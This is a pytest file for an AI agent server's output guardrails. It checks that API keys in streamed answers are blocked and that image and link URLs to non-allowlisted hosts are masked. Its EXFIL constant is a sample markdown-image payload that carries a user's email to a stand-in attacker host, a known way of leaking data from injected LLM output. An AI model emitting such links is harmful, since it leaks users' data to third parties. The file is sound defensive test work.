"""PoC-8 (022 H-6, ADR-008 item 5): the chassis checks a streamed answer for secrets, and masks
image and link URLs to hosts not on `spec.guardrails.output_url_allow`, complete and streamed.

Red-team cases this closes: `secret-04-streamed-answer-has-key` and `exfil-04-markdown-image`.
Both checks are regex in the chassis, with no port call, so they hold with `guardrails: none`.
Offline: httpx over ASGI and a fake engine that streams scripted deltas.
"""

from __future__ import annotations

import json
from collections.abc import AsyncIterator, Sequence
from contextlib import asynccontextmanager
from typing import Any

import httpx
import pytest
from chassis.core.envelope import Context, TaskInput
from chassis.core.events import Delta, End, Error, Event
from chassis.fakes import FakeEngine, InMemoryConfig, InMemoryTelemetry, ScriptedModel
from chassis.ports.bundle import PortBundle
from chassis.server import ChassisConfig, create_app
from chassis.server.output_filter import find_secret, host_allowed, mask_urls
from chassis.server.stream_guard import StreamFilter
from fastapi import FastAPI

KEY = "sk-redteam-3333333333333333demo"  # pragma: allowlist secret (a made-up test value)
EXFIL = "![status](https://img.attacker.invalid/p.png?d=jane.doe%40example.com)"


def _scripted(deltas: Sequence[str], end_text: str | None = None) -> Any:
    async def handle(task: TaskInput, ctx: Context) -> AsyncIterator[Event]:
        for text in deltas:
            yield Delta(text=text)
        yield End(output={"text": end_text} if end_text is not None else None)

    return handle


def _app(
    deltas: Sequence[str],
    *,
    guardrails: dict[str, Any] | None = None,
    end_text: str | None = None,
    telemetry: InMemoryTelemetry | None = None,
) -> FastAPI:
    spec: dict[str, Any] = {
        "engine": {"connector": "inprocess", "handle": "chassis.core.handle:echo_wire"},
    }
    if guardrails is not None:
        spec["guardrails"] = guardrails
    config = ChassisConfig.model_validate(
        {"version": "c", "profile": "fake", "agent": {"name": "echo", "version": "1"}, "spec": spec}
    )
    ports = PortBundle(
        model=ScriptedModel(),
        engine=FakeEngine(handle=_scripted(deltas, end_text)),
        config=InMemoryConfig(),
        telemetry=telemetry or InMemoryTelemetry(),
    )
    return create_app(config, ports)


@asynccontextmanager
async def _client(app: FastAPI) -> AsyncIterator[httpx.AsyncClient]:
    async with (
        app.router.lifespan_context(app),
        httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://c") as client,
    ):
        yield client


def _sse_events(text: str) -> list[dict[str, Any]]:
    return [json.loads(line[6:]) for line in text.splitlines() if line.startswith("data: {")]


def _errors(text: str) -> list[dict[str, Any]]:
    return [e for e in _sse_events(text) if e.get("type") == "error"]


async def _run(app: FastAPI, *, stream: bool) -> httpx.Response:
    async with _client(app) as client:
        return await client.post("/v1/run", json={"input": {"text": "x"}, "stream": stream})


# --- the patterns -------------------------------------------------------------------------------


def test_find_secret_names_the_kind_never_the_value() -> None:
    assert find_secret(f"the key is {KEY}") == "api_key"
    assert find_secret("AKIAABCDEFGHIJKLMNOP") == "aws_access_key"
    assert find_secret("LITELLM_API_KEY=abcdefgh12") == "key_assignment"
    assert find_secret("nothing to see") is None


@pytest.mark.parametrize(
    ("host", "allow", "ok"),
    [
        ("docs.example.com", ["docs.example.com"], True),
        ("DOCS.example.com", ["docs.example.com"], True),
        ("evil.invalid", ["docs.example.com"], False),
        ("a.example.com", ["*.example.com"], True),
        ("example.com", ["*.example.com"], False),
        ("evilexample.com", ["*.example.com"], False),
        ("anything.invalid", ["*"], True),
        ("anything.invalid", [], False),
    ],
)
def test_host_allowed(host: str, allow: list[str], ok: bool) -> None:
    assert host_allowed(host, allow) is ok


def test_mask_urls_removes_images_links_definitions_and_html_to_other_hosts() -> None:
    text = (
        f"Done. {EXFIL} See [docs](https://docs.example.com/a) and [x](https://evil.invalid/q).\n"
        '[ref]: https://evil.invalid/r\n<img src="https://evil.invalid/i.png"> [local](/help)'
    )
    masked, count = mask_urls(text, ["docs.example.com"])
    assert count == 4
    assert "attacker" not in masked
    assert "evil.invalid" not in masked
    assert "https://docs.example.com/a" in masked
    assert "[local](/help)" in masked
    assert "![status]()" in masked


def test_mask_urls_with_star_changes_nothing() -> None:
    assert mask_urls(EXFIL, ["*"]) == (EXFIL, 0)


# --- the stream filter, unit --------------------------------------------------------------------


def _feed(deltas: Sequence[str], *, allow: Sequence[str] = ("*",)) -> list[Event]:
    flt = StreamFilter(allow=list(allow), secrets=True)
    out: list[Event] = []
    for text in deltas:
        out.extend(flt.feed(Delta(text=text)))
        if out and isinstance(out[-1], Error):
            return out
    out.extend(flt.flush())
    return out


def _text(events: Sequence[Event]) -> str:
    return "".join(e.text for e in events if isinstance(e, Delta))


def test_a_key_split_across_deltas_never_leaves_in_part() -> None:
    events = _feed(["Sure, the key is sk-red", "team-3333", "333333333333", "3demo. Bye"])
    assert isinstance(events[-1], Error)
    assert events[-1].code == "guardrail_blocked"
    assert "sk-" not in _text(events)


def test_plain_text_keeps_its_delta_boundaries() -> None:
    deltas = ["Hello ", "world, ", "how are ", "you?"]
    events = _feed(deltas)
    assert [e.text for e in events if isinstance(e, Delta)] == deltas


def test_a_link_split_across_deltas_is_masked() -> None:
    events = _feed(["Done. ![sta", "tus](https://img.att", "acker.invalid/p.png) ok"], allow=[])
    assert "attacker" not in _text(events)
    assert _text(events).startswith("Done. ![status]()")


# --- through the app ----------------------------------------------------------------------------


async def test_a_streamed_answer_with_a_key_is_closed_with_guardrail_blocked() -> None:
    telemetry = InMemoryTelemetry()
    app = _app(["Sure, the key ", f"is {KEY[:10]}", f"{KEY[10:]}."], telemetry=telemetry)
    res = await _run(app, stream=True)
    assert KEY[:6] not in res.text
    assert [e["code"] for e in _errors(res.text)] == ["guardrail_blocked"]
    assert telemetry.counter_value(
        "chassis.guardrail_blocked", stage="output_stream", reason="secret"
    )


async def test_the_end_text_of_a_stream_is_checked_too() -> None:
    res = await _run(_app(["fine"], end_text=f"fine {KEY}"), stream=True)
    assert KEY not in res.text
    assert [e["code"] for e in _errors(res.text)] == ["guardrail_blocked"]


async def test_stream_secrets_false_lets_it_through() -> None:
    res = await _run(_app([f"key {KEY}"], guardrails={"stream_secrets": False}), stream=True)
    assert KEY in res.text


@pytest.mark.parametrize("stream", [False, True])
async def test_a_markdown_image_to_another_host_is_masked(stream: bool) -> None:
    res = await _run(_app([f"Done. {EXFIL}"], end_text=f"Done. {EXFIL}"), stream=stream)
    assert res.status_code == 200
    assert "attacker" not in res.text
    assert "![status]()" in res.text


@pytest.mark.parametrize("stream", [False, True])
async def test_an_allowed_host_stays(stream: bool) -> None:
    text = "See ![chart](https://img.example.com/c.png)."
    allow = {"output_url_allow": ["*.example.com"]}
    res = await _run(_app([text], guardrails=allow), stream=stream)
    assert "https://img.example.com/c.png" in res.text


async def test_the_masked_complete_answer_is_what_the_envelope_holds() -> None:
    app = _app(["Done. ", EXFIL], end_text=f"Done. {EXFIL}")
    res = await _run(app, stream=False)
    output = res.json()["output"]
    assert output["text"] == "Done. ![status]()"
